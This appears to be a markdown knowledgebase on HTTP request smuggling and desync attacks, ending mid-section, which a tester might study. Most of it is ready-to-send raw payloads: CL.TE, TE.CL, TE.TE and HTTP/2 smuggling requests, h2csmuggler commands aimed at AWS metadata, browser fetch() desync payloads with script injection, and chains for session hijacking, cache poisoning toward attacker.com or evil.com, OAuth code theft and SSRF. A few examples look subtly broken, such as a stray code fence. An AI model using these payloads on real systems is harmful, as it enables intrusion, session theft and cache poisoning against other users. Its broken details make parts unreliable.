# HTTP Request Smuggling / HTTP Desync Attacks - Complete Research Knowledgebase

> **Version**: Research Grade v1.0 | **Last Updated**: 2026-05-24
> 
> **Scope**: Consolidated from PortSwigger Research, HackTricks, PayloadsAllTheThings, GitHub tools, Nuclei templates, and real-world bug bounty findings.

---

## Table of Contents

1. [Basics](#basics)
2. [HTTP Request Smuggling Theory](#http-request-smuggling-theory)
3. [HTTP Parser Internals](#http-parser-internals)
4. [CL.TE Payloads](#clte-payloads)
5. [TE.CL Payloads](#tecl-payloads)
6. [TE.TE Payloads](#tete-payloads)
7. [HTTP/2 Desync Payloads](#http2-desync-payloads)
8. [H2C Smuggling Payloads](#h2c-smuggling-payloads)
9. [Browser-Powered Desync Attacks](#browser-powered-desync-attacks)
10. [Response Queue Poisoning](#response-queue-poisoning)
11. [Request Queue Poisoning](#request-queue-poisoning)
12. [Cache Poisoning + Request Smuggling Chains](#cache-poisoning--request-smuggling-chains)
13. [OAuth + Request Smuggling Chains](#oauth--request-smuggling-chains)
14. [SSRF + Request Smuggling Chains](#ssrf--request-smuggling-chains)
15. [WebSocket + Request Smuggling Chains](#websocket--request-smuggling-chains)
16. [Parser Confusion Payloads](#parser-confusion-payloads)
17. [Browser Quirks](#browser-quirks)
18. [Gadget Chains](#gadget-chains)
19. [Real World Case Studies](#real-world-case-studies)
20. [Fuzzing Payloads](#fuzzing-payloads)
21. [Automation Workflows](#automation-workflows)
22. [Recon Methodology](#recon-methodology)
23. [Nuclei Templates](#nuclei-templates)
24. [Tools and Scanners](#tools-and-scanners)
25. [Advanced Research](#advanced-research)
26. [Bug Bounty Writeups](#bug-bounty-writeups)
27. [Payload Collections](#payload-collections)
28. [WAF Bypasses](#waf-bypasses)
29. [Detection Techniques](#detection-techniques)
30. [References](#references)

---

## Basics

### What is HTTP Request Smuggling?

HTTP request smuggling is an attack technique that interferes with how a website processes sequences of HTTP requests received from one or more users. It exploits discrepancies in how different systems (front-end proxy/load balancer vs. back-end server) interpret the boundaries between HTTP requests.

**Core Principle**: When multiple systems process a request but disagree on where the request starts/ends, this disagreement can be used to interfere with another user's request/response or bypass security controls.

### Why It Works

HTTP/1.1 allows requests to be sent over a single TCP connection (keep-alive). The protocol provides two mechanisms to indicate where a request body ends:

1. **Content-Length header**: Specifies the exact byte length of the body
2. **Transfer-Encoding: chunked**: Body is sent in chunks with size prefixes

When both headers are present, the HTTP/1.1 specification says `Transfer-Encoding` should take precedence. However, not all implementations follow this rule consistently.

### Attack Prerequisites

- The target uses a chain of HTTP servers (e.g., CDN -> WAF -> Origin)
- The servers use different parsing logic for request boundaries
- The connection between front-end and back-end uses HTTP/1.1 keep-alive
- The attacker can send crafted requests that trigger parsing discrepancies

---

## HTTP Request Smuggling Theory

### The Three Main Variants

| Variant | Front-End | Back-End | Mechanism |
|---------|-----------|----------|-----------|
| **CL.TE** | Uses Content-Length | Uses Transfer-Encoding | Front-end reads CL bytes, back-end reads chunked |
| **TE.CL** | Uses Transfer-Encoding | Uses Content-Length | Front-end reads chunked, back-end reads CL bytes |
| **TE.TE** | Both support TE | Both support TE | One server is tricked by obfuscated TE header |

### How Desync Occurs

```
[Attacker] --(1)--> [Front-End] --(2)--> [Back-End]
```

1. Attacker sends a crafted request with both `Content-Length` and `Transfer-Encoding`
2. Front-end processes one header, back-end processes the other
3. The "smuggled" prefix from the first request becomes the start of the next request
4. When another user's request arrives on the same connection, it gets appended to the smuggled prefix

### Impact Scenarios

- **Bypass front-end security controls** (WAF, auth, rate limiting)
- **Access internal/admin endpoints** (by changing Host header in smuggled request)
- **Steal other users' requests** (response queue poisoning)
- **Cache poisoning** (store malicious responses in shared cache)
- **Credential hijacking** (capture victim's request containing cookies/auth tokens)
- **Reflective XSS** (via response queue poisoning with reflected input)

---

## HTTP Parser Internals

### RFC 7230 Parsing Rules

According to RFC 7230 Section 3.3.3:

> "If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length."

However, many implementations deviate from this specification.

### Key Parser Behaviors

#### Content-Length Parsing

- Some servers accept multiple `Content-Length` headers and use the first
- Some use the last `Content-Length` header
- Some reject requests with conflicting Content-Length values
- Some ignore Content-Length if Transfer-Encoding is present
- Some parse Content-Length even when Transfer-Encoding: chunked is present

#### Transfer-Encoding Parsing

- **Case sensitivity**: Some servers treat `Transfer-encoding` differently from `Transfer-Encoding`
- **Whitespace handling**: Leading/trailing spaces, tabs, and exotic whitespace characters
- **Value parsing**: Some accept `chunked, identity` while others reject non-standard values
- **Header folding**: Legacy HTTP/1.0 allowed multi-line headers via line folding

#### Chunked Encoding Parsing

```
chunk-size [ chunk-ext ] CRLF
chunk-data CRLF
last-chunk CRLF
CRLF
```

- **Chunk size**: Hexadecimal number; some parsers accept `0x` prefix, some don't
- **Chunk extensions**: Semicolon-separated extensions after chunk size
- **Line endings**: CRLF (`\r\n`) vs LF (`\n`) - some parsers accept both
- **Trailing headers**: Headers after the final chunk (rarely used)

### Common Parser Discrepancies

| Discrepancy | Front-End Behavior | Back-End Behavior |
|-------------|-------------------|-------------------|
| Multiple CL headers | Uses first | Uses last |
| TE header with space | Ignores (not recognized) | Processes as valid TE |
| TE with non-chunked value | Rejects | Accepts and processes |
| Chunk size with leading zeros | Accepts | Rejects |
| LF-only line endings | Accepts | Requires CRLF |
| Chunk extensions | Ignores | Parses as part of size |

---

## CL.TE Payloads

### Theory

**CL.TE (Content-Length / Transfer-Encoding)**: The front-end server uses the `Content-Length` header, while the back-end server uses the `Transfer-Encoding: chunked` header.

The front-end reads exactly `Content-Length` bytes and forwards them. The back-end sees `Transfer-Encoding: chunked` and tries to parse the body as chunked encoding. The smuggled prefix starts after the front-end's CL bytes but is interpreted as part of the chunked stream by the back-end.

### Basic CL.TE Detection Payload

```http
POST / HTTP/1.1
Host: {{Hostname}}
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**Explanation**:
- Front-end reads 6 bytes: `0\r\n\r\nG` (the `0\r\n` is the chunked terminator, `\r\nG` is leftover)
- Back-end sees `Transfer-Encoding: chunked`, reads `0` as chunk size (end of body), then `\r\nG` becomes the start of the next request
- The next request arriving on the connection becomes `GPOST / HTTP/1.1...`

### CL.TE Admin Bypass Payload

```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

**Explanation**:
- Front-end reads 116 bytes (the entire crafted body)
- Back-end processes chunked encoding: `0` terminates the first request body
- Everything after `0\r\n\r\n` becomes a new request: `GET /admin HTTP/1.1...`
- The `Host: localhost` bypasses front-end routing that checks the original Host header

### CL.TE Differential Response Confirmation

```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

**Confirmation technique**: Send two requests. The first smuggles a request to a non-existent path (`/404`). The second is a normal request. If the second response has a 404 status, the smuggling worked.

### CL.TE Session Hijacking Payload

```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Length: 55
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: {{Hostname}}
Content-Length: 20

search=
```

**Chain**: Smuggle a POST to a logging/search endpoint. When the victim's request arrives, their cookies/session data get appended to the `search=` parameter and logged.

### CL.TE Cache Poisoning Payload

```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Length: 130
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: {{Hostname}}
X-Forwarded-Host: attacker.com
Content-Length: 5

x=1
```

**Chain**: Poison the cache by smuggling a request with a malicious `X-Forwarded-Host` header that causes the origin to return a redirect or XSS payload, which gets cached.

---

## TE.CL Payloads

### Theory

**TE.CL (Transfer-Encoding / Content-Length)**: The front-end server uses `Transfer-Encoding: chunked`, while the back-end server uses the `Content-Length` header.

The front-end parses the body as chunked encoding and forwards the de-chunked content. The back-end reads exactly `Content-Length` bytes from the forwarded content. The remaining bytes become the start of the next request.

**CRITICAL**: For TE.CL, you MUST manually calculate the chunk size for the smuggled request. The `Content-Length` in the outer request must match the byte length of the smuggled prefix.

### Basic TE.CL Detection Payload

```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

**Explanation**:
- Front-end processes chunked encoding:
  - `5c` (92 in hex) = chunk size for the smuggled request
  - `GPOST / HTTP/1.1...x=1` = 92 bytes of chunk data
  - `0` = terminating chunk
- Front-end forwards the de-chunked body to the back-end
- Back-end reads exactly `Content-Length: 4` bytes (the first 4 bytes of the de-chunked content)
- The rest becomes the start of the next request

**Note**: The chunk size `5c` (92) must exactly match the byte length of:
```
GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
```

### TE.CL Admin Bypass Payload

```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

**Confirmation**: The smuggled `POST /404` causes a 404 response that gets paired with the next legitimate request.

### TE.CL Chunk Size Calculation Guide

```python
# Python helper to calculate chunk sizes for TE.CL payloads

def calculate_chunk_size(smuggled_request: str) -> str:
    """
    Calculate the hex chunk size for a smuggled request.
    smuggled_request should include all bytes including \r\n line endings.
    """
    if isinstance(smuggled_request, str):
        body = smuggled_request.encode('utf-8')
    else:
        body = smuggled_request

    size = len(body)
    return hex(size)[2:]  # Remove '0x' prefix

# Example usage:
smuggled = "GPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n"
chunk_size = calculate_chunk_size(smuggled)
print(f"Chunk size: {chunk_size}")  # Output: 5c
```

### TE.CL With Body Reflection

```http
POST /search HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7b
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=x
0

```

**Chain**: The back-end reads 4 bytes from the de-chunked body, then the victim's request gets appended to the smuggled request's body, causing the victim's data to be reflected in the search results.

---

## TE.TE Payloads

### Theory

**TE.TE (Transfer-Encoding / Transfer-Encoding)**: Both the front-end and back-end support `Transfer-Encoding: chunked`, but one of them can be induced not to process it by obfuscating the header in some way.

This variant requires finding an obfuscation technique that one server recognizes as valid `Transfer-Encoding` while the other server ignores it (falling back to `Content-Length`).

### TE.TE Obfuscation Techniques

```http
# Technique 1: Extra space before colon
Transfer-Encoding : chunked

# Technique 2: Tab character instead of space
Transfer-Encoding:	chunked

# Technique 3: Tab before colon
Transfer-Encoding	: chunked

# Technique 4: Trailing space in value
Transfer-Encoding: chunked 

# Technique 5: Non-standard value
Transfer-Encoding: xchunked

# Technique 6: Multiple TE headers with different values
Transfer-Encoding: chunked
Transfer-Encoding: x

# Technique 7: Case variation
Transfer-encoding: chunked

# Technique 8: Header folding (legacy HTTP/1.0)
Transfer-Encoding:
 chunked

# Technique 9: Prefix with whitespace
 Transfer-Encoding: chunked

# Technique 10: Line break injection in header name
X: X
Transfer-Encoding: chunked

# Technique 11: Carriage return injection
X: XTransfer-Encoding: chunked

# Technique 12: Exotic whitespace characters (0x00-0x20)
Transfer-Encoding:\x00chunked
Transfer-Encoding:\x01chunked
Transfer-Encoding:\x08chunked
Transfer-Encoding:	chunked
Transfer-Encoding:\x0bchunked
Transfer-Encoding:\x0cchunked
Transfer-Encoding:chunked
Transfer-Encoding:\x1fchunked
Transfer-Encoding: chunked
Transfer-Encoding:\x7fchunked
Transfer-Encoding: chunked
Transfer-Encoding:ÿchunked
```

### Complete TE.TE Payload with Obfuscation

```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

**Explanation**:
- Front-end sees `Transfer-Encoding: chunked` (valid) and `Transfer-Encoding: x` (invalid). Uses the first valid one: chunked.
- Back-end sees both headers. Depending on implementation, might reject the request, use the first, or use the last. If it uses the last (`Transfer-Encoding: x` which it doesn't recognize), it falls back to `Content-Length: 4`.
- Result: Front-end reads chunked, back-end reads 4 bytes -> desync achieved.

### Exhaustive TE.TE Mutation List (from Smuggler tool)

```python
# From defparam/smuggler default.py config
mutations = {
    "nameprefix1": " Transfer-Encoding: chunked",      # Leading space
    "tabprefix1": "Transfer-Encoding:	chunked",      # Tab after colon
    "tabprefix2": "Transfer-Encoding	:	chunked",   # Tab before and after colon
    "space1": "Transfer-Encoding : chunked",          # Space before colon
    "midspace-01": "Transfer-Encoding:\x01chunked",   # SOH after colon
    "midspace-04": "Transfer-Encoding:\x04chunked",   # EOT after colon
    "midspace-08": "Transfer-Encoding:\x08chunked",   # BS after colon
    "midspace-09": "Transfer-Encoding:	chunked",   # TAB after colon
    "midspace-0a": "Transfer-Encoding:
chunked",   # LF after colon
    "midspace-0b": "Transfer-Encoding:\x0bchunked",   # VT after colon
    "midspace-0c": "Transfer-Encoding:\x0cchunked",   # FF after colon
    "midspace-0d": "Transfer-Encoding:chunked",   # CR after colon
    "midspace-1f": "Transfer-Encoding:\x1fchunked",   # US after colon
    "midspace-20": "Transfer-Encoding: chunked",       # Space after colon (normal)
    "midspace-7f": "Transfer-Encoding:\x7fchunked",   # DEL after colon
    "midspace-a0": "Transfer-Encoding: chunked",   # NBSP after colon
    "midspace-ff": "Transfer-Encoding:ÿchunked",   # Invalid UTF-8 after colon
    "postspace-01": "Transfer-Encoding\x01: chunked", # SOH before colon
    "postspace-09": "Transfer-Encoding	: chunked", # TAB before colon
    "prespace-01": "\x01Transfer-Encoding: chunked",   # SOH before header
    "prespace-20": " Transfer-Encoding: chunked",    # Space before header
    "endspace-01": "Transfer-Encoding: chunked\x01",  # SOH after value
    "endspace-20": "Transfer-Encoding: chunked ",     # Space after value
    "xprespace-01": "X: X\x01Transfer-Encoding: chunked", # SOH in previous header
    "endspacex-01": "Transfer-Encoding: chunked\x01X: X", # SOH after value with next header
    "rxprespace-0a": "X: X
Transfer-Encoding: chunked", # CR+LF injection
    "xnprespace-0a": "X: X

Transfer-Encoding: chunked", # LF injection
    "endspacerx-0a": "Transfer-Encoding: chunked
X: X", # CR+LF after value
    "endspacexn-0a": "Transfer-Encoding: chunked

X: X", # LF after value
}
```

---

## HTTP/2 Desync Payloads

### Theory

HTTP/2 desync attacks exploit the conversion from HTTP/2 to HTTP/1.1 (downgrading). HTTP/2 uses a binary framing layer and pseudo-headers (`:method`, `:path`, `:authority`, `:scheme`), while HTTP/1.1 uses text-based headers.

When a front-end HTTP/2 server downgrades requests to HTTP/1.1 for the back-end, discrepancies can occur:

1. **Header injection via newlines**: HTTP/2 headers are binary and can contain `\r\n`, which become separate headers in HTTP/1.1
2. **Pseudo-header confusion**: `:authority` might be converted to `Host`, but with different parsing
3. **Content-Length smuggling**: HTTP/2 has its own body length mechanism, but the converted HTTP/1.1 request may include a smuggled `Content-Length`
4. **Transfer-Encoding injection**: Similar to CL/TE but via HTTP/2 header injection

### HTTP/2 to HTTP/1.1 Downgrade Payload

```http
# HTTP/2 request (as seen by front-end)
:method POST
:path /
:authority www.example.com
:scheme https
content-length: 0

# After downgrade to HTTP/1.1, the back-end sees:
POST / HTTP/1.1
Host: www.example.com
Content-Length: 0

GET /admin HTTP/1.1
Host: www.example.com
```

**Technique**: The HTTP/2 request body contains a complete HTTP/1.1 request. After downgrade, the back-end receives two requests on the same connection.

### HTTP/2 Header Injection (CRLF in Header Value)

```http
# HTTP/2 request with injected CRLF in header value
:method GET
:path /
:authority www.example.com
header: ignored

GET / HTTP/1.1
Host: www.example.com
```

**Result after downgrade**:
```http
GET / HTTP/1.1
Host: www.example.com
header: ignored

GET / HTTP/1.1
Host: www.example.com
```

### HTTP/2 Content-Length Smuggling

```http
# HTTP/2 request
:method POST
:path /
:authority www.example.com
content-length: 5

# Body:
0

X
```

**After downgrade**:
```http
POST / HTTP/1.1
Host: www.example.com
Content-Length: 5

0

X
```

The back-end might process the `0

` as chunked encoding terminator, making `X` the start of the next request.

### HTTP/2 Desync via Transfer-Encoding Injection

```http
# HTTP/2 request
:method POST
:path /
:authority www.example.com
transfer-encoding: chunked

# Body:
0


GET /admin HTTP/1.1
Host: localhost


```

**Critical**: Some HTTP/2 implementations strip `transfer-encoding` during downgrade, but others don't. If the back-end sees `Transfer-Encoding: chunked` in the converted HTTP/1.1 request, it will process the body as chunked.

### HTTP/2 Desync Detection Algorithm (from http2smugl)

The detection works by:
1. Sending a smuggled version of `Transfer-Encoding: chunked` (e.g., `transfer_encoding: chunked`)
2. Sending different bodies: valid (`0

`) and invalid (`999
`)
3. If responses differ (one hangs/timeout, one returns immediately), the back-end is processing the smuggled header

```
# Detection technique 1: Timeout-based
Smuggled header + invalid body -> backend hangs waiting for more data
Smuggled header + valid body -> backend returns immediately

# Detection technique 2: Status code differentiation
Smuggled CL with value 1 -> one response code
Smuggled CL with value -1 -> different response code
```

### HTTP/2 Smuggling Techniques Summary

| Technique | Description | Tool |
|-----------|-------------|------|
| Space smuggling | `transfer_encoding: chunked` (underscore instead of dash) | http2smugl |
| Newline injection | Header value contains `\r\n` | http2smugl |
| UTF-8 smuggling | `transfer-encoding: chunſed` (using ſ \u017f which uppercases to S) | http2smugl |
| Case smuggling | `Transfer-Encoding: chunƘed` (using Ƙ \u212a which lowercases to k) | http2smugl |
| Pseudo-header abuse | `:authority` vs `Host` discrepancy | Manual |
| HTTP/2 continuation abuse | Split headers across continuation frames | Manual |

---

## H2C Smuggling Payloads

### Theory

**H2C (HTTP/2 Cleartext) Smuggling** exploits the HTTP/1.1 `Upgrade` mechanism. When a client sends:

```http
GET / HTTP/1.1
Host: example.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
```

The server may respond with `101 Switching Protocols` and upgrade the connection to HTTP/2 cleartext.

**The Vulnerability**: If a front-end proxy forwards the `Upgrade: h2c` and `HTTP2-Settings` headers to a back-end server that supports H2C, the back-end will upgrade the connection. The attacker can then send HTTP/2 frames directly to the back-end, bypassing the proxy's access controls.

### H2C Upgrade Request

```http
GET / HTTP/1.1
Host: vulnerable-website.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
```

### H2C Smuggling Exploitation Flow

1. **Attacker** sends H2C upgrade request to **Front-End Proxy**
2. **Front-End** forwards upgrade headers to **Back-End**
3. **Back-End** responds with `101 Switching Protocols`
4. **Front-End** forwards `101` response to **Attacker**
5. **Attacker** now has a direct HTTP/2 connection to the **Back-End**
6. **Attacker** sends HTTP/2 requests directly to back-end, bypassing proxy rules

### H2C Smuggling with Internal Endpoint Access

```bash
# Using h2csmuggler tool
./h2csmuggler.py -x https://edgeserver http://backend/flag

# With custom headers
./h2csmuggler.py -x https://edgeserver \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 172.16.0.1" \
  http://backend/system/dashboard

# With POST data
./h2csmuggler.py -x https://edgeserver \
  -X POST \
  -d '{"user":128457, "role": "admin"}' \
  -H "Content-Type: application/json" \
  http://backend/api/internal/user/permissions
```

### H2C SSRF to AWS Metadata

```bash
# Step 1: Retrieve IMDSv2 token
./h2csmuggler.py -x https://edgeserver \
  -X PUT \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  http://169.254.169.254/latest/api/token

# Step 2: Use token to access metadata
./h2csmuggler.py -x https://edgeserver \
  -H "x-aws-ec2-metadata-token: TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

### H2C Brute-Force Internal Endpoints

```bash
./h2csmuggler.py -x https://edgeserver \
  -i dirs.txt \
  http://localhost/
```

Where `dirs.txt` contains paths like:
```
/api/
/admin/
/internal/
/flag
/debug
/actuator
/metrics
```

---

## Browser-Powered Desync Attacks

### Theory

**Browser-Powered Desync (Client-Side Desync)** is a variant where the attacker uses a victim's browser to trigger the desync. Unlike traditional request smuggling that requires the attacker to send raw HTTP, browser-powered desync uses JavaScript's `fetch()` API.

The key insight: Some servers don't expect POST requests on certain paths and treat them as simple GET requests, ignoring the body. This means a browser can send a POST with a crafted body that gets interpreted as multiple requests.

### Basic Browser-Powered Desync

```javascript
fetch('https://www.example.com/', {
    method: 'POST',
    body: "GET / HTTP/1.1
Host: www.example.com",
    mode: 'no-cors',
    credentials: 'include'
});
```

**What happens**:
1. Browser sends a POST request with the body containing a raw HTTP request
2. The server treats the POST as a GET and ignores the body
3. But if there's a proxy in between, the proxy might process the body differently
4. The proxy sees the body as a second request and forwards it

### Advanced Browser-Powered Desync with Redirect

```javascript
fetch('https://www.example.com/redirect', {
    method: 'POST',
    body: `HEAD /404/ HTTP/1.1
Host: www.example.com

GET /x?x=<script>alert(1)</script> HTTP/1.1
X: Y`,
    credentials: 'include',
    mode: 'cors'  // Will throw error on redirect, triggering catch block
}).catch(() => {
    location = 'https://www.example.com/'
});
```

**Exploitation chain**:
1. Browser sends POST to `/redirect`
2. Server returns a redirect (blocked by CORS, causing catch block to execute)
3. Browser navigates to `https://www.example.com/`
4. The server incorrectly processes the `HEAD` request from the POST body instead of the browser's GET
5. Server returns 404 with Content-Length, then responds to the next misinterpreted request (`GET /x?x=<script>...`)
6. Browser accepts the HEAD response as the GET response and executes the script

### Browser-Powered Desync for Credential Theft

```javascript
fetch('https://vulnerable-site.com/profile', {
    method: 'POST',
    body: `POST /log HTTP/1.1
Host: vulnerable-site.com
Content-Length: 5

x=`,
    credentials: 'include',
    mode: 'no-cors'
});
```

**Chain**: The victim's next request to the site gets appended to the smuggled `x=` parameter, potentially leaking cookies or auth tokens to a logging endpoint.

### Browser-Powered Desync for Internal Site Attack

```javascript
// Attacker cannot access internal site directly, but victim can
fetch('https://public-site.com/api', {
    method: 'POST',
    body: `GET /internal/admin HTTP/1.1
Host: internal-site.com

`,
    credentials: 'include',
    mode: 'no-cors'
});
```

**Chain**: The smuggled request gets forwarded to an internal server that the attacker cannot reach directly.

---

## Response Queue Poisoning

### Theory

**Response Queue Poisoning** exploits the fact that HTTP/1.1 keep-alive connections process requests in order but responses may be paired differently if request parsing goes wrong.

When a desync occurs:
1. Attacker sends Request A (with smuggled prefix)
2. Back-end processes Request A + smuggled prefix as Request B
3. Victim sends Request C on the same connection
4. Back-end processes Request C as Request D (appended to smuggled prefix)
5. Responses get mismatched: Attacker receives Victim's response, Victim receives Attacker's response

### Response Queue Poisoning via H2.TE

```http
# HTTP/2 request that gets downgraded
POST / HTTP/2
Host: www.example.com
Content-Length: 0

# Body contains smuggled HTTP/1.1 request
GET /admin HTTP/1.1
Host: localhost
```

**Result**: The back-end processes the smuggled request and returns the admin panel response to the attacker's next request on the connection.

### Response Queue Poisoning Exploitation Chain

```
Attacker Request 1: POST / (with smuggled prefix)
  -> Front-end forwards to back-end
  -> Back-end sees: POST / (body) + GET /admin (smuggled)

Attacker Request 2: GET /normal
  -> Front-end forwards to back-end
  -> Back-end pairs this with the response to GET /admin
  -> Attacker receives admin panel response!

Victim Request: GET /home
  -> Front-end forwards to back-end  
  -> Back-end pairs this with response to GET /normal
  -> Victim receives normal page (confused but unharmed)
```

### Response Queue Poisoning with Reflection Gadget

```http
# Step 1: Find a reflection gadget (page that reflects request body)
POST /RequestParamExample HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

foo=bar
```

# Step 2: Use it to capture victim requests
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

POST /RequestParamExample HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 1000

param1=
```

**Chain**: The victim's request gets appended to `param1=`, and the reflection gadget page reflects the entire victim request (including cookies, auth tokens) in the response.

---

## Request Queue Poisoning

### Theory

**Request Queue Poisoning** is the inverse of response queue poisoning. Instead of stealing responses, the attacker poisons the request queue so that the victim's request gets modified or redirected.

### Request Queue Poisoning via CL.TE

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Admin-Header: true
Content-Length: 5

x=
```

**Chain**:
1. Attacker sends the above request
2. Front-end reads 150 bytes (entire crafted request)
3. Back-end sees chunked encoding, processes `0` as terminator
4. The remaining bytes become a new request: `GET /admin...`
5. Victim's next request gets appended to `x=`, making the back-end process:
   ```
   GET /admin HTTP/1.1
   Host: target.com
   X-Admin-Header: true
   Content-Length: 5

   x=GET /home HTTP/1.1
   Host: target.com
   Cookie: session= victim_cookie
   ```
6. The victim's request is now a request to `/admin` with the victim's cookies!

---

## Cache Poisoning + Request Smuggling Chains

### Theory

**Cache Poisoning via Request Smuggling** combines two powerful techniques:
1. Use request smuggling to bypass front-end security and reach the origin
2. Poison the shared cache with a malicious response
3. All subsequent users receive the poisoned response

### Cache Poisoning + CL.TE Chain

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Content-Length: 5

x=1
```

**Chain**:
1. Attacker smuggles a request to `/` with `X-Forwarded-Host: attacker.com`
2. The origin generates a response with attacker-controlled URLs (Open Graph, scripts, redirects)
3. The response gets cached by the CDN
4. All subsequent visitors to `/` receive the poisoned response
5. Attacker controls resources loaded by all users

### Cache Poisoning + TE.CL Chain

```http
POST /api/search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7b
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
Content-Length: 5

x=1
0

```

### Cache Key Injection via Request Smuggling

```http
# Akamai cache key injection
GET /?x=2 HTTP/1.1
Host: example.com
Origin: '-alert(1)-'__
```

**Chain**: The cache key becomes `/example.com/ cid=x=2__Origin='-alert(1)-'__`. By crafting another request with the same key components, the attacker can poison the cache with XSS.

### Cache Parameter Cloaking via Smuggling

```http
POST /search HTTP/1.1
Host: example.com
Content-Length: 80
Transfer-Encoding: chunked

0

GET /search?q=help?_=payload&!&search=1 HTTP/1.1
Host: example.com
```

**Chain**: The cache excludes `?_=` from the key, but the back-end processes it as a parameter. The attacker can poison arbitrary parameters without changing the cache key.

---

## OAuth + Request Smuggling Chains

### Theory

OAuth flows involve redirects between the client, authorization server, and resource server. Request smuggling can interfere with these redirects to steal authorization codes or tokens.

### OAuth Authorization Code Theft

```http
POST /callback HTTP/1.1
Host: oauth-provider.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /callback?code=ATTACKER_CODE HTTP/1.1
Host: oauth-provider.com
Content-Length: 5

x=
```

**Chain**:
1. Attacker smuggles a request to `/callback` with a fake authorization code
2. Victim's legitimate OAuth callback gets appended to `x=`
3. The back-end processes the victim's real code as part of the smuggled request
4. Attacker can extract the victim's authorization code from logs or responses

### OAuth State Parameter Bypass

```http
POST /auth HTTP/1.1
Host: oauth-provider.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /auth?client_id=legit&redirect_uri=attacker.com&state=FORGED HTTP/1.1
Host: oauth-provider.com
```

**Chain**: The smuggled request includes a forged state parameter. When the victim's request arrives, the OAuth provider validates the forged state against the victim's session, causing a mismatch or allowing the attacker to correlate requests.

---

## SSRF + Request Smuggling Chains

### Theory

**SSRF via Request Smuggling** uses the desync to make the back-end server send requests to internal services that the attacker cannot reach directly.

### Basic SSRF via CL.TE

```http
POST / HTTP/1.1
Host: public-facing.com
Content-Length: 120
Transfer-Encoding: chunked

0

GET http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: 169.254.169.254
Content-Length: 5

x=
```

**Chain**:
1. Attacker smuggles a request to the AWS metadata IP
2. The back-end server (which has access to internal network) sends the request
3. Victim's next request gets appended, potentially causing the metadata response to be returned to the victim (or logged)

### SSRF via Host Header Override

```http
POST / HTTP/1.1
Host: public-facing.com
Content-Length: 100
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: internal-api.local
Content-Length: 5

x=
```

**Chain**: The back-end uses the smuggled `Host: internal-api.local` to route the request to an internal service.

### SSRF via Absolute URL in Smuggled Request

```http
POST / HTTP/1.1
Host: public-facing.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET http://internal-service:8080/admin HTTP/1.1
Host: internal-service:8080
X-Internal-Auth: true
Content-Length: 5

x=
```

---

## WebSocket + Request Smuggling Chains

### Theory

WebSocket connections start with an HTTP upgrade request. Request smuggling can be used to:
1. Smuggle a WebSocket upgrade request past security controls
2. Hijack WebSocket connections to internal services
3. Use WebSocket frames to tunnel traffic after smuggling

### WebSocket Upgrade Smuggling

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Content-Length: 5

x=
```

**Chain**: The smuggled WebSocket upgrade request gets processed by the back-end, establishing a WebSocket connection that bypasses front-end security checks.

### WebSocket Hijacking via H2C

```bash
# Step 1: Establish H2C tunnel
./h2csmuggler.py -x https://edgeserver http://backend/ws

# Step 2: Send WebSocket upgrade inside HTTP/2 stream
